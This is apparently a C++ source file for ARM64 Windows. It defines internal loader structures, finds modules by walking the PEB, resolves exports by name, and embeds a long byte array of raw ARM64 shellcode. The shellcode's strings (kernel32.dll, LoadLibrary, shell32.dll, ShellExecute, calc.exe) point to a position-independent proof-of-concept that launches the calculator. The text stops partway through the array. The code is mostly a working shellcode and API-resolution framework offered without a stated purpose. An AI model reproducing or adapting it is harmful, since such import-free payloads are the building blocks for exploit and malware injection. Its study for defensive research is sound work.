#include <iostream>
#include <Windows.h>


//0x18 bytes (sizeof)
struct _RTL_BALANCED_NODE
{
    union
    {
        struct _RTL_BALANCED_NODE* Children[2];                             //0x0
        struct
        {
            struct _RTL_BALANCED_NODE* Left;                                //0x0
            struct _RTL_BALANCED_NODE* Right;                               //0x8
        };
    };
    union
    {
        struct
        {
            UCHAR Red : 1;                                                    //0x10
            UCHAR Balance : 2;                                                //0x10
        };
        ULONGLONG ParentValue;                                              //0x10
    };
};

//0x10 bytes (sizeof)
struct _UNICODE_STRING
{
    USHORT Length;                                                          //0x0
    USHORT MaximumLength;                                                   //0x2
    WCHAR* Buffer;                                                          //0x8
};

//0x138 bytes (sizeof)
struct _LDR_DATA_TABLE_ENTRY
{
    struct _LIST_ENTRY InLoadOrderLinks;                                    //0x0
    struct _LIST_ENTRY InMemoryOrderLinks;                                  //0x10
    struct _LIST_ENTRY InInitializationOrderLinks;                          //0x20
    VOID* DllBase;                                                          //0x30
    VOID* EntryPoint;                                                       //0x38
    ULONG SizeOfImage;                                                      //0x40
    struct _UNICODE_STRING FullDllName;                                     //0x48
    struct _UNICODE_STRING BaseDllName;                                     //0x58
    union
    {
        UCHAR FlagGroup[4];                                                 //0x68
        ULONG Flags;                                                        //0x68
        struct
        {
            ULONG PackagedBinary : 1;                                         //0x68
            ULONG MarkedForRemoval : 1;                                       //0x68
            ULONG ImageDll : 1;                                               //0x68
            ULONG LoadNotificationsSent : 1;                                  //0x68
            ULONG TelemetryEntryProcessed : 1;                                //0x68
            ULONG ProcessStaticImport : 1;                                    //0x68
            ULONG InLegacyLists : 1;                                          //0x68
            ULONG InIndexes : 1;                                              //0x68
            ULONG ShimDll : 1;                                                //0x68
            ULONG InExceptionTable : 1;                                       //0x68
            ULONG ReservedFlags1 : 2;                                         //0x68
            ULONG LoadInProgress : 1;                                         //0x68
            ULONG LoadConfigProcessed : 1;                                    //0x68
            ULONG EntryProcessed : 1;                                         //0x68
            ULONG ProtectDelayLoad : 1;                                       //0x68
            ULONG ReservedFlags3 : 2;                                         //0x68
            ULONG DontCallForThreads : 1;                                     //0x68
            ULONG ProcessAttachCalled : 1;                                    //0x68
            ULONG ProcessAttachFailed : 1;                                    //0x68
            ULONG CorDeferredValidate : 1;                                    //0x68
            ULONG CorImage : 1;                                               //0x68
            ULONG DontRelocate : 1;                                           //0x68
            ULONG CorILOnly : 1;                                              //0x68
            ULONG ChpeImage : 1;                                              //0x68
            ULONG ChpeEmulatorImage : 1;                                      //0x68
            ULONG ReservedFlags5 : 1;                                         //0x68
            ULONG Redirected : 1;                                             //0x68
            ULONG ReservedFlags6 : 2;                                         //0x68
            ULONG CompatDatabaseProcessed : 1;                                //0x68
        };
    };
    USHORT ObsoleteLoadCount;                                               //0x6c
    USHORT TlsIndex;                                                        //0x6e
    struct _LIST_ENTRY HashLinks;                                           //0x70
    ULONG TimeDateStamp;                                                    //0x80
    struct _ACTIVATION_CONTEXT* EntryPointActivationContext;                //0x88
    VOID* Lock;                                                             //0x90
    struct _LDR_DDAG_NODE* DdagNode;                                        //0x98
    struct _LIST_ENTRY NodeModuleLink;                                      //0xa0
    struct _LDRP_LOAD_CONTEXT* LoadContext;                                 //0xb0
    VOID* ParentDllBase;                                                    //0xb8
    VOID* SwitchBackContext;                                                //0xc0
    struct _RTL_BALANCED_NODE BaseAddressIndexNode;                         //0xc8
    struct _RTL_BALANCED_NODE MappingInfoIndexNode;                         //0xe0
    ULONGLONG OriginalBase;                                                 //0xf8
    union _LARGE_INTEGER LoadTime;                                          //0x100
    ULONG BaseNameHashValue;                                                //0x108
    enum _LDR_DLL_LOAD_REASON LoadReason;                                   //0x10c
    ULONG ImplicitPathOptions;                                              //0x110
    ULONG ReferenceCount;                                                   //0x114
    ULONG DependentLoadFlags;                                               //0x118
    UCHAR SigningLevel;                                                     //0x11c
    ULONG CheckSum;                                                         //0x120
    VOID* ActivePatchImageBase;                                             //0x128
    enum _LDR_HOT_PATCH_STATE HotPatchState;                                //0x130
};

//0x58 bytes (sizeof)
struct _PEB_LDR_DATA
{
    ULONG Length;                                                           //0x0
    UCHAR Initialized;                                                      //0x4
    VOID* SsHandle;                                                         //0x8
    struct _LIST_ENTRY InLoadOrderModuleList;                               //0x10
    struct _LIST_ENTRY InMemoryOrderModuleList;                             //0x20
    struct _LIST_ENTRY InInitializationOrderModuleList;                     //0x30
    VOID* EntryInProgress;                                                  //0x40
    UCHAR ShutdownInProgress;                                               //0x48
    VOID* ShutdownThreadId;                                                 //0x50
};

struct _PEBARM64
{
    UCHAR InheritedAddressSpace;                                            //0x0
    UCHAR ReadImageFileExecOptions;                                         //0x1
    UCHAR BeingDebugged;                                                    //0x2
    union
    {
        UCHAR BitField;                                                     //0x3
        struct
        {
            UCHAR ImageUsesLargePages : 1;                                    //0x3
            UCHAR IsProtectedProcess : 1;                                     //0x3
            UCHAR IsImageDynamicallyRelocated : 1;                            //0x3
            UCHAR SkipPatchingUser32Forwarders : 1;                           //0x3
            UCHAR IsPackagedProcess : 1;                                      //0x3
            UCHAR IsAppContainer : 1;                                         //0x3
            UCHAR IsProtectedProcessLight : 1;                                //0x3
            UCHAR IsLongPathAwareProcess : 1;                                 //0x3
        };
    };
    UCHAR Padding0[4];                                                      //0x4
    VOID* Mutant;                                                           //0x8
    VOID* ImageBaseAddress;                                                 //0x10
    struct _PEB_LDR_DATA* Ldr;                                              //0x18

};

#pragma intrinsic(__getReg)

static inline wchar_t manual_towlower(wchar_t c) {

    if (c >= L'A' && c <= L'Z') return c + (L'a' - L'A');

    if (c >= 0x00C0 && c <= 0x00D6) return c + (0x00E0 - 0x00C0);

    if (c >= 0x00D8 && c <= 0x00DE) return c + (0x00F8 - 0x00D8);

    return c;
}

int wcsicmp_manual(const wchar_t* s1, const wchar_t* s2) {

    wchar_t c1, c2;
    while (*s1 != L'\0' && *s2 != L'\0') {

        c1 = manual_towlower(*s1++);
        c2 = manual_towlower(*s2++);
        if (c1 != c2) return (c1 < c2) ? -1 : 1;

    }

    c1 = manual_towlower(*s1);
    c2 = manual_towlower(*s2);

    if (c1 == c2) return 0;

    return (c1 < c2) ? -1 : 1;
}

int strcmp_manual(const char* s1, const char* s2) {

    unsigned char c1, c2;

    while (1) {

        c1 = (unsigned char)*s1++;
        c2 = (unsigned char)*s2++;

        if (c1 != c2) return (c1 < c2) ? -1 : 1;

        if (c1 == '\0') return 0;

    }
}

uintptr_t module_from_peb(WCHAR* module_name) {

    // Get PEB from TEB (x18 on ARM64) + 0x60
    auto peb = *reinterpret_cast<_PEBARM64**>(__getReg(18) + 0x60);

    auto flinkx = *reinterpret_cast<_LDR_DATA_TABLE_ENTRY**>(&peb->Ldr->InLoadOrderModuleList);

    do {

        if (wcsicmp_manual(flinkx->BaseDllName.Buffer, module_name) == 0) return reinterpret_cast<uintptr_t>(flinkx->DllBase);

        flinkx = reinterpret_cast<_LDR_DATA_TABLE_ENTRY*>(flinkx->InLoadOrderLinks.Flink);

    } while (flinkx && flinkx->BaseDllName.Buffer != nullptr);

    return 0;
}

uintptr_t GetFunctionAddressByName(uintptr_t moduleBase, char* functionName) {

    if (!moduleBase || !functionName) return 0;

    auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(moduleBase);
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>((BYTE*)moduleBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return 0;

    const auto& exportDataDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDataDir.VirtualAddress == 0) return 0;

    auto exportDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(reinterpret_cast<unsigned char*>(moduleBase) + exportDataDir.VirtualAddress);
    auto namesRVA = reinterpret_cast<DWORD*>(reinterpret_cast<unsigned char*>(moduleBase) + exportDir->AddressOfNames);
    auto ordinalsRVA = reinterpret_cast<WORD*>(reinterpret_cast<unsigned char*>(moduleBase) + exportDir->AddressOfNameOrdinals);
    auto functionsRVA = reinterpret_cast<DWORD*>(reinterpret_cast<unsigned char*>(moduleBase) + exportDir->AddressOfFunctions);

    for (auto i = 0; i < exportDir->NumberOfNames; ++i) {

        auto name = reinterpret_cast<const char*>(reinterpret_cast<unsigned char*>(moduleBase) + namesRVA[i]);

        if (strcmp_manual(name, functionName) == 0) {

            auto ordinal = ordinalsRVA[i];
            auto funcRVA = functionsRVA[ordinal];

            return reinterpret_cast<uintptr_t>(reinterpret_cast<unsigned char*>(moduleBase) + funcRVA);
        }
    }

    return 0;
}

static unsigned char rawData[2049] = {

    0xC0, 0x04, 0x00, 0xB4, 0xA1, 0x04, 0x00, 0xB4, 0x08, 0x00, 0x40, 0x79,
    0xA9, 0x49, 0x8B, 0x52, 0x1F, 0x01, 0x09, 0x6B, 0x21, 0x04, 0x00, 0x54,
    0x08, 0x3C, 0x40, 0xB9, 0x09, 0xAA, 0x88, 0x52, 0x0B, 0xC0, 0x28, 0x8B,
    0x68, 0x01, 0x40, 0xB9, 0x1F, 0x01, 0x09, 0x6B, 0x61, 0x03, 0x00, 0x54,
    0x68, 0x89, 0x40, 0xB9, 0x28, 0x03, 0x00, 0x34, 0x0A, 0x40, 0x28, 0x8B,
    0x49, 0x21, 0x44, 0x29, 0x0F, 0x40, 0x28, 0x8B, 0x0B, 0x40, 0x29, 0x8B,
    0x49, 0x21, 0x43, 0x29, 0x0E, 0x40, 0x28, 0x8B, 0x08, 0x00, 0x80, 0x52,
    0x29, 0x02, 0x00, 0x34, 0x2A, 0x00, 0xC0, 0x39, 0x6C, 0x59, 0x68, 0xB8,
    0x0D, 0x40, 0x2C, 0x8B, 0xAC, 0x01, 0x40, 0x39, 0xA7, 0x05, 0x00, 0x91,
    0x2D, 0x04, 0x00, 0x91, 0x9F, 0x01, 0x2A, 0x6B, 0xC1, 0x00, 0x00, 0x54,
    0x4C, 0x01, 0x00, 0x34, 0xEC, 0x14, 0x40, 0x38, 0xA6, 0x15, 0xC0, 0x38,
    0x9F, 0x01, 0x26, 0x6B, 0x80, 0xFF, 0xFF, 0x54, 0x08, 0x05, 0x00, 0x11,
    0x1F, 0x01, 0x09, 0x6B, 0x43, 0xFE, 0xFF, 0x54, 0x00, 0x00, 0x80, 0xD2,
    0xC0, 0x03, 0x5F, 0xD6, 0xE8, 0x59, 0x68, 0x78, 0xC8, 0x79, 0x68, 0xB8,
    0x00, 0x40, 0x28, 0x8B, 0xC0, 0x03, 0x5F, 0xD6, 0xED, 0x03, 0x12, 0xAA,
    0xAD, 0x31, 0x40, 0xF9, 0x0E, 0xE8, 0x9F, 0x52, 0x06, 0xE5, 0x9F, 0x52,
    0xAD, 0x0D, 0x40, 0xF9, 0xAF, 0x09, 0x40, 0xF9, 0xED, 0xF7, 0x9F, 0x52,
    0xEB, 0x31, 0x40, 0xF9, 0xEC, 0x03, 0x00, 0xAA, 0x68, 0x01, 0x40, 0x79,
    0x48, 0x06, 0x00, 0x34, 0x88, 0x01, 0x40, 0x79, 0x08, 0x06, 0x00, 0x34,
    0x6A, 0x01, 0x40, 0x79, 0x6B, 0x09, 0x00, 0x91, 0x49, 0x01, 0x0D, 0x0B,
    0x29, 0x3D, 0x00, 0x53, 0x3F, 0x65, 0x00, 0x71, 0x88, 0x00, 0x00, 0x54,
    0x4A, 0x81, 0x00, 0x11, 0x4A, 0x3D, 0x00, 0x53, 0x0E, 0x00, 0x00, 0x14,
    0x49, 0x01, 0x0E, 0x0B, 0x29, 0x3D, 0x00, 0x53, 0x3F, 0x59, 0x00, 0x71,
    0x88, 0x00, 0x00, 0x54, 0x4A, 0x81, 0x00, 0x11, 0x4A, 0x3D, 0x00, 0x53,
    0x07, 0x00, 0x00, 0x14, 0x49, 0x01, 0x06, 0x0B, 0x27, 0x3D, 0x00, 0x53,
    0x49, 0x81, 0x00, 0x11, 0x29, 0x3D, 0x00, 0x53, 0xFF, 0x18, 0x00, 0x71,
    0x4A, 0x81, 0x89, 0x1A, 0x09, 0x01, 0x0D, 0x0B, 0x29, 0x3D, 0x00, 0x53,
    0x3F, 0x65, 0x00, 0x71, 0x8C, 0x09, 0x00, 0x91, 0x88, 0x00, 0x00, 0x54,
    0x08, 0x81, 0x00, 0x11, 0x08, 0x3D, 0x00, 0x53, 0x0E, 0x00, 0x00, 0x14,
    0x09, 0x01, 0x0E, 0x0B, 0x29, 0x3D, 0x00, 0x53, 0x3F, 0x59, 0x00, 0x71,
    0x88, 0x00, 0x00, 0x54, 0x08, 0x81, 0x00, 0x11, 0x08, 0x3D, 0x00, 0x53,
    0x07, 0x00, 0x00, 0x14, 0x09, 0x01, 0x06, 0x0B, 0x27, 0x3D, 0x00, 0x53,
    0x09, 0x81, 0x00, 0x11, 0x29, 0x3D, 0x00, 0x53, 0xFF, 0x18, 0x00, 0x71,
    0x08, 0x81, 0x89, 0x1A, 0x5F, 0x01, 0x08, 0x6B, 0xE1, 0x05, 0x00, 0x54,
    0x68, 0x01, 0x40, 0x79, 0x08, 0xFA, 0xFF, 0x35, 0x6B, 0x01, 0x40, 0x79,
    0x68, 0x01, 0x0D, 0x0B, 0x08, 0x3D, 0x00, 0x53, 0x1F, 0x65, 0x00, 0x71,
    0x88, 0x00, 0x00, 0x54, 0x6B, 0x81, 0x00, 0x11, 0x68, 0x3D, 0x00, 0x53,
    0x0E, 0x00, 0x00, 0x14, 0x68, 0x01, 0x0E, 0x0B, 0x08, 0x3D, 0x00, 0x53,
    0x1F, 0x59, 0x00, 0x71, 0x88, 0x00, 0x00, 0x54, 0x6B, 0x81, 0x00, 0x11,
    0x68, 0x3D, 0x00, 0x53, 0x07, 0x00, 0x00, 0x14, 0x68, 0x01, 0x06, 0x0B,
    0x0A, 0x3D, 0x00, 0x53, 0x68, 0x81, 0x00, 0x11, 0x09, 0x3D, 0x00, 0x53,
    0x5F, 0x19, 0x00, 0x71, 0x68, 0x81, 0x89, 0x1A, 0x8B, 0x01, 0x40, 0x79,
    0x6C, 0x01, 0x0D, 0x0B, 0x8C, 0x3D, 0x00, 0x53, 0x9F, 0x65, 0x00, 0x71,
    0x88, 0x00, 0x00, 0x54, 0x6B, 0x81, 0x00, 0x11, 0x6B, 0x3D, 0x00, 0x53,
    0x0E, 0x00, 0x00, 0x14, 0x6C, 0x01, 0x0E, 0x0B, 0x8C, 0x3D, 0x00, 0x53,
    0x9F, 0x59, 0x00, 0x71, 0x88, 0x00, 0x00, 0x54, 0x6B, 0x81, 0x00, 0x11,
    0x6B, 0x3D, 0x00, 0x53, 0x07, 0x00, 0x00, 0x14, 0x6C, 0x01, 0x06, 0x0B,
    0x89, 0x3D, 0x00, 0x53, 0x6C, 0x81, 0x00, 0x11, 0x8C, 0x3D, 0x00, 0x53,
    0x3F, 0x19, 0x00, 0x71, 0x6B, 0x81, 0x8C, 0x1A, 0x1F, 0x01, 0x0B, 0x6B,
    0xE0, 0x00, 0x00, 0x54, 0xEF, 0x01, 0x40, 0xF9, 0x6F, 0x00, 0x00, 0xB4,
    0xEB, 0x31, 0x40, 0xF9, 0x8B, 0xF3, 0xFF, 0xB5, 0x00, 0x00, 0x80, 0xD2,
    0xC0, 0x03, 0x5F, 0xD6, 0xE0, 0x19, 0x40, 0xF9, 0xC0, 0x03, 0x5F, 0xD6,
    0x08, 0x00, 0x40, 0x39, 0x0B, 0x04, 0x00, 0x91, 0x29, 0x00, 0x40, 0x39,
    0x2A, 0x04, 0x00, 0x91, 0x1F, 0x01, 0x09, 0x6B, 0xC1, 0x00, 0x00, 0x54,
    0x28, 0x01, 0x00, 0x34, 0x68, 0x15, 0x40, 0x38, 0x49, 0x15, 0x40, 0x38,
    0x1F, 0x01, 0x09, 0x6B, 0x80, 0xFF, 0xFF, 0x54, 0x1F, 0x01, 0x09, 0x6B,
    0x28, 0x00, 0x80, 0x52, 0x00, 0x25, 0x88, 0x5A, 0xC0, 0x03, 0x5F, 0xD6,
    0x00, 0x00, 0x80, 0x52, 0xC0, 0x03, 0x5F, 0xD6, 0x00, 0x00, 0x00, 0x00,
    0x08, 0x00, 0x40, 0x79, 0xEB, 0xF7, 0x9F, 0x52, 0x0C, 0xE8, 0x9F, 0x52,
    0x0E, 0xE5, 0x9F, 0x52, 0x48, 0x06, 0x00, 0x34, 0x28, 0x00, 0x40, 0x79,
    0x08, 0x06, 0x00, 0x34, 0x09, 0x00, 0x40, 0x79, 0x00, 0x08, 0x00, 0x91,
    0x2A, 0x01, 0x0B, 0x0B, 0x4A, 0x3D, 0x00, 0x53, 0x5F, 0x65, 0x00, 0x71,
    0x88, 0x00, 0x00, 0x54, 0x29, 0x81, 0x00, 0x11, 0x29, 0x3D, 0x00, 0x53,
    0x0E, 0x00, 0x00, 0x14, 0x2A, 0x01, 0x0C, 0x0B, 0x4A, 0x3D, 0x00, 0x53,
    0x5F, 0x59, 0x00, 0x71, 0x88, 0x00, 0x00, 0x54, 0x29, 0x81, 0x00, 0x11,
    0x29, 0x3D, 0x00, 0x53, 0x07, 0x00, 0x00, 0x14, 0x2A, 0x01, 0x0E, 0x0B,
    0x4D, 0x3D, 0x00, 0x53, 0x2A, 0x81, 0x00, 0x11, 0x4A, 0x3D, 0x00, 0x53,
    0xBF, 0x19, 0x00, 0x71, 0x29, 0x81, 0x8A, 0x1A, 0x0A, 0x01, 0x0B, 0x0B,
    0x4A, 0x3D, 0x00, 0x53, 0x5F, 0x65, 0x00, 0x71, 0x21, 0x08, 0x00, 0x91,
    0x88, 0x00, 0x00, 0x54, 0x08, 0x81, 0x00, 0x11, 0x08, 0x3D, 0x00, 0x53,
    0x0E, 0x00, 0x00, 0x14, 0x0A, 0x01, 0x0C, 0x0B, 0x4A, 0x3D, 0x00, 0x53,
    0x5F, 0x59, 0x00, 0x71, 0x88, 0x00, 0x00, 0x54, 0x08, 0x81, 0x00, 0x11,
    0x08, 0x3D, 0x00, 0x53, 0x07, 0x00, 0x00, 0x14, 0x0A, 0x01, 0x0E, 0x0B,
    0x4D, 0x3D, 0x00, 0x53, 0x0A, 0x81, 0x00, 0x11, 0x4A, 0x3D, 0x00, 0x53,
    0xBF, 0x19, 0x00, 0x71, 0x08, 0x81, 0x8A, 0x1A, 0x3F, 0x01, 0x08, 0x6B,
    0x21, 0x06, 0x00, 0x54, 0x08, 0x00, 0x40, 0x79, 0x08, 0xFA, 0xFF, 0x35,
    0x08, 0x00, 0x40, 0x79, 0x09, 0x01, 0x0B, 0x0B, 0x29, 0x3D, 0x00, 0x53,
    0x3F, 0x65, 0x00, 0x71, 0x88, 0x00, 0x00, 0x54, 0x08, 0x81, 0x00, 0x11,
    0x09, 0x3D, 0x00, 0x53, 0x0E, 0x00, 0x00, 0x14, 0x09, 0x01, 0x0C, 0x0B,
    0x29, 0x3D, 0x00, 0x53, 0x3F, 0x59, 0x00, 0x71, 0x88, 0x00, 0x00, 0x54,
    0x08, 0x81, 0x00, 0x11, 0x09, 0x3D, 0x00, 0x53, 0x07, 0x00, 0x00, 0x14,
    0x09, 0x01, 0x0E, 0x0B, 0x2D, 0x3D, 0x00, 0x53, 0x09, 0x81, 0x00, 0x11,
    0x2A, 0x3D, 0x00, 0x53, 0xBF, 0x19, 0x00, 0x71, 0x09, 0x81, 0x8A, 0x1A,
    0x28, 0x00, 0x40, 0x79, 0x0B, 0x01, 0x0B, 0x0B, 0x6B, 0x3D, 0x00, 0x53,
    0x7F, 0x65, 0x00, 0x71, 0x88, 0x00, 0x00, 0x54, 0x0B, 0x81, 0x00, 0x11,
    0x68, 0x3D, 0x00, 0x53, 0x0E, 0x00, 0x00, 0x14, 0x0B, 0x01, 0x0C, 0x0B,
    0x6B, 0x3D, 0x00, 0x53, 0x7F, 0x59, 0x00, 0x71, 0x88, 0x00, 0x00, 0x54,
    0x0B, 0x81, 0x00, 0x11, 0x68, 0x3D, 0x00, 0x53, 0x07, 0x00, 0x00, 0x14,
    0x0B, 0x01, 0x0E, 0x0B, 0x6C, 0x3D, 0x00, 0x53, 0x0B, 0x81, 0x00, 0x11,
    0x6B, 0x3D, 0x00, 0x53, 0x9F, 0x19, 0x00, 0x71, 0x08, 0x81, 0x8B, 0x1A,
    0x3F, 0x01, 0x08, 0x6B, 0x61, 0x00, 0x00, 0x54, 0x00, 0x00, 0x80, 0x52,
    0xC0, 0x03, 0x5F, 0xD6, 0x2B, 0x00, 0x80, 0x52, 0x3F, 0x01, 0x08, 0x6B,
    0x60, 0x25, 0x8B, 0x5A, 0xC0, 0x03, 0x5F, 0xD6, 0xFD, 0x7B, 0xB8, 0xA9,
    0xFD, 0x03, 0x00, 0x91, 0x49, 0x10, 0x00, 0x58, 0xFF, 0xE3, 0x00, 0x79,
    0x48, 0x10, 0x00, 0x58, 0xFF, 0x13, 0x01, 0x39, 0xE9, 0xA3, 0x05, 0xA9,
    0x28, 0x10, 0x00, 0x58, 0xE8, 0x37, 0x00, 0xF9, 0x28, 0x10, 0x00, 0x58,
    0xE8, 0x1F, 0x00, 0xF9, 0x28, 0x4C, 0x8E, 0x52, 0x28, 0x2F, 0xA8, 0x72,
    0xE8, 0x43, 0x00, 0xB9, 0xC8, 0x0F, 0x00, 0x58, 0xE8, 0x17, 0x00, 0xF9,
    0x88, 0x8C, 0x8D, 0x52, 0x88, 0x0D, 0xA0, 0x72, 0xE8, 0x33, 0x00, 0xB9,
    0x68, 0x0F, 0x00, 0x58, 0xE8, 0x27, 0x00, 0xF9, 0x68, 0xAC, 0x8E, 0x52,
    0x88, 0xAE, 0xAC, 0x72, 0xE8, 0x53, 0x00, 0xB9, 0x28, 0x08, 0x80, 0x52,
    0xE8, 0xAB, 0x00, 0x79, 0xC8, 0x0E, 0x00, 0x58, 0xE8, 0x0F, 0x00, 0xF9,
    0xE8, 0x0D, 0x8E, 0x52, 0xA8, 0xCC, 0xAD, 0x72, 0xE0, 0x63, 0x01, 0x91,
    0xE8, 0x13, 0x00, 0xB9, 0xFF, 0x83, 0x00, 0x39, 0xFF, 0x53, 0x00, 0x39,
    0xF4, 0xFE, 0xFF, 0x97, 0x80, 0x04, 0x00, 0xB4, 0x09, 0x00, 0x40, 0x79,
    0xA8, 0x49, 0x8B, 0x52, 0x3F, 0x01, 0x08, 0x6B, 0x01, 0x04, 0x00, 0x54,
    0x08, 0x3C, 0x40, 0xB9, 0x0A, 0xC0, 0x28, 0x8B, 0x08, 0xAA, 0x88, 0x52,
    0x49, 0x01, 0x40, 0xB9, 0x3F, 0x01, 0x08, 0x6B, 0x41, 0x03, 0x00, 0x54,
    0x48, 0x89, 0x40, 0xB9, 0x08, 0x03, 0x00, 0x34, 0x0B, 0x40, 0x28, 0x8B,
    0x69, 0x21, 0x44, 0x29, 0x0D, 0x40, 0x28, 0x8B, 0x0A, 0x40, 0x29, 0x8B,
    0x69, 0x21, 0x43, 0x29, 0x0C, 0x40, 0x28, 0x8B, 0x08, 0x00, 0x80, 0x52,
    0x09, 0x02, 0x00, 0x34, 0x4E, 0x59, 0x68, 0xB8, 0x0F, 0x40, 0x2E, 0x8B,
    0xEE, 0x01, 0x40, 0x39, 0xE7, 0x05, 0x00, 0x91, 0xEF, 0xE7, 0x00, 0x91,
    0xDF, 0x31, 0x01, 0x71, 0xC1, 0x00, 0x00, 0x54, 0xEE, 0x01, 0x00, 0x34,
    0xEE, 0x14, 0x40, 0x38, 0xE4, 0x15, 0xC0, 0x38, 0xDF, 0x01, 0x24, 0x6B,
    0x80, 0xFF, 0xFF, 0x54, 0x08, 0x05, 0x00, 0x11, 0x1F, 0x01, 0x09, 0x6B,
    0x43, 0xFE, 0xFF, 0x54, 0x08, 0x00, 0x80, 0xD2, 0xE0, 0xA3, 0x00, 0x91,
    0x00, 0x01, 0x3F, 0xD6, 0x00, 0x01, 0x00, 0xB5, 0x00, 0x00, 0x80, 0x12,
    0xFD, 0x7B, 0xC8, 0xA8, 0xC0, 0x03, 0x5F, 0xD6, 0xA8, 0x59, 0x68, 0x78,
    0x88, 0x79, 0x68, 0xB8, 0x08, 0x40, 0x28, 0x8B, 0xF7, 0xFF, 0xFF, 0x17,
    0x09, 0x00, 0x40, 0x79, 0xA8, 0x49, 0x8B, 0x52, 0x3F, 0x01, 0x08, 0x6B,
    0x01, 0x04, 0x00, 0x54, 0x08, 0x3C, 0x40, 0xB9, 0x0A, 0xC0, 0x28, 0x8B,
    0x08, 0xAA, 0x88, 0x52, 0x49, 0x01, 0x40, 0xB9, 0x3F, 0x01, 0x08, 0x6B,
    0x41, 0x03, 0x00, 0x54, 0x48, 0x89, 0x40, 0xB9, 0x08, 0x03, 0x00, 0x34,
    0x0B, 0x40, 0x28, 0x8B, 0x69, 0x21, 0x44, 0x29, 0x0D, 0x40, 0x28, 0x8B,
    0x0A, 0x40, 0x29, 0x8B, 0x69, 0x21, 0x43, 0x29, 0x0C, 0x40, 0x28, 0x8B,
    0x08, 0x00, 0x80, 0x52, 0x09, 0x02, 0x00, 0x34, 0x4E, 0x59, 0x68, 0xB8,
    0x0F, 0x40, 0x2E, 0x8B, 0xEE, 0x01, 0x40, 0x39, 0xE7, 0x05, 0x00, 0x91,
    0xEF, 0x27, 0x01, 0x91, 0xDF, 0x4D, 0x01, 0x71, 0xC1, 0x00, 0x00, 0x54,
    0x6E, 0x02, 0x00, 0x34, 0xEE, 0x14, 0x40, 0x38, 0xE6, 0x15, 0xC0, 0x38,
    0xDF, 0x01, 0x26, 0x6B, 0x80, 0xFF, 0xFF, 0x54, 0x08, 0x05, 0x00, 0x11,
    0x1F, 0x01, 0x09, 0x6B, 0x43, 0xFE, 0xFF, 0x54, 0x08, 0x00, 0x80, 0xD2,
    0x25, 0x00, 0x80, 0x52, 0x04, 0x00, 0x80, 0xD2, 0x03, 0x00, 0x80, 0xD2,
    0xE2, 0x63, 0x00, 0x91, 0xE1, 0x43, 0x00, 0x91, 0x00, 0x00, 0x80, 0xD2,
    0x00, 0x01, 0x3F, 0xD6, 0x00, 0x00, 0x80, 0x52, 0xFD, 0x7B, 0xC8, 0xA8,
    0xC0, 0x03, 0x5F, 0xD6, 0xA8, 0x59, 0x68, 0x78, 0x88, 0x79, 0x68, 0xB8,
    0x08, 0x40, 0x28, 0x8B, 0xF3, 0xFF, 0xFF, 0x17, 0x6B, 0x00, 0x65, 0x00,
    0x72, 0x00, 0x6E, 0x00, 0x65, 0x00, 0x6C, 0x00, 0x33, 0x00, 0x32, 0x00,
    0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00, 0x4C, 0x6F, 0x61, 0x64,
    0x4C, 0x69, 0x62, 0x72, 0x73, 0x68, 0x65, 0x6C, 0x6C, 0x33, 0x32, 0x2E,
    0x53, 0x68, 0x65, 0x6C, 0x6C, 0x45, 0x78, 0x65, 0x63, 0x61, 0x6C, 0x63,
    0x2E, 0x65, 0x78, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
